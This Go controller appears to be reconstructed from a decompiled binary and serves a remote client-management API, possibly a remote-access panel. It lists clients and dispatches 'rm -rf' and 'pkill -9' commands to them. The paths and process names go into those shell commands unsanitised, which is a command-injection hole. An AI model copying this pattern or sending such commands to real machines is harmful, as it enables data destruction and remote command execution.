// Package controllers implements handlers for the client-management API.
// The endpoint surface and response fields reflect this implementation; inferred
// compatibility with another binary should be verified independently.
package controllers

import (
	"strconv"
	"strings"
)

// ClientController handles client records exposed by the management API.
type ClientController struct {
	ApiBaseController
}

// List returns a page of client records. A status value of 1 filters to online
// clients and 2 filters to offline clients; other values do not apply that filter.
func (c *ClientController) List() {
	page := c.JsonGetInt("page")
	if page < 1 {
		page = 1
	}
	pageSize := c.JsonGetInt("pageSize")
	if pageSize < 1 {
		pageSize = 10
	}
	status := c.JsonGetInt("status")
	field := c.JsonGetStr("field")
	order := c.JsonGetStr("order")
	search := c.JsonGetStr("search")
	sort := c.JsonGetStr("sort")

	clients, total := engineGetClientList((page-1)*pageSize, pageSize, field, order, search, sort, status)

	items := make([]map[string]interface{}, 0, len(clients))
	online := int64(0)
	for _, cl := range clients {
		if status == 1 && !cl.Status {
			continue
		}
		if status == 2 && cl.Status {
			continue
		}
		if cl.Status {
			online++
		}
		items = append(items, map[string]interface{}{
			"id":       cl.ID,
			"ip":       cl.IP,
			"status":   cl.Status,
			"remark":   cl.Remark,
			"Port":     cl.Port,
			"DnsPort":  cl.DnsPort,
			"version":  cl.Version,
			"isAdmin":  cl.IsAdmin,
			"os":       cl.OSType,
			"arch":     cl.Arch,
			"lastTime": cl.LastTime,
		})
	}
	c.JsonOkResult(map[string]interface{}{
		"clientCount":       total,
		"clientOnlineCount": online,
		"total":             total,
		"items":             items,
	})
}

// Add 添加客户端（POST /client/add）。
// 反编译（0x18db980）参数：ip（支持 "ip:port" 形式，":" 分隔符）。
func (c *ClientController) Add() {
	ip := c.JsonGetStr("ip")
	if ip == "" {
		c.JsonErr("ip required")
		return
	}
	// 原版支持 "host:port" 输入，分隔出端口后按 IP 添加。
	if idx := strings.IndexByte(ip, ':'); idx >= 0 {
		ip = ip[:idx]
	}
	if err := engineAddClient(ip, ""); err != nil {
		c.JsonErr("add client failed: " + err.Error())
		return
	}
	c.JsonOkMessage("ok")
}

// EditRemark 修改客户端备注（POST /client/editremark）。
// 反编译（0x18dbd80）参数：id / remark。
func (c *ClientController) EditRemark() {
	id := int64(c.JsonGetInt("id"))
	remark := c.JsonGetStr("remark")
	if id == 0 {
		c.JsonErr("id err")
		return
	}
	engineEditClientRemark(id, remark)
	c.JsonOkMessage("ok")
}

// DelFile 删除客户端上的文件（POST /client/delfile）。
// 反编译（0x18dbe80）参数：id / paths（多路径以 "|<-" 分隔）。
func (c *ClientController) DelFile() {
	id := int64(c.JsonGetInt("id"))
	paths := c.JsonGetStr("paths")
	if id == 0 || paths == "" {
		c.JsonErr("id and paths required")
		return
	}
	for _, p := range strings.Split(paths, "|<-") {
		if p = strings.TrimSpace(p); p != "" {
			dispatchCmd(id, "rm -rf "+p)
		}
	}
	c.JsonOkMessage("ok")
}

// DelProcess 结束客户端进程（POST /client/delprocess）。
// 反编译（0x18dc180）参数：id / pid / name。
func (c *ClientController) DelProcess() {
	id := int64(c.JsonGetInt("id"))
	pid := c.JsonGetInt("pid")
	name := c.JsonGetStr("name")
	if id == 0 || (pid == 0 && name == "") {
		c.JsonErr("id and pid/name required")
		return
	}
	var cmd string
	if pid > 0 {
		cmd = "kill -9 " + strconv.Itoa(pid)
	} else {
		cmd = "pkill -9 " + name
	}
	dispatchCmd(id, cmd)
	c.JsonOkMessage("ok")
}

// DelList 批量删除客户端（POST /client/dellist）。
// 反编译（0x18dc2c0）参数：id（逗号分隔的客户端 ID 列表）。
func (c *ClientController) DelList() {
	ids := c.JsonGetIntList("id")
	if len(ids) == 0 {
		c.JsonErr("id err")
		return
	}
	id64 := make([]int64, len(ids))
	for i, v := range ids {
		id64[i] = int64(v)
	}
	engineDelClients(id64)
	c.JsonOkMessage("ok")
}
